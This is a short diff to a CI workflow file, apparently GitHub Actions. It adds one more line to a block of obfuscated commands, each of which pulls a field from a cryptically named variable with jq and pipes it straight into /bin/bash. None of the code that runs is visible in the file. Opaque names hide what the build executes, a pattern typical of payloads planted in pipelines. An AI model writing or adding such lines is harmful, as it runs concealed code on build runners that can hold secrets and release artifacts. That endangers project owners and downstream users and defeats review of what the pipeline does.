@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$g0" | jq -r .meik4 | /bin/bash
           echo $zpgs344 | jq -r .hh127 | /bin/bash
           echo $v409 | jq -r .unx20 | /bin/bash
+          printf '%s' "$p8" | jq -r .bn185 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
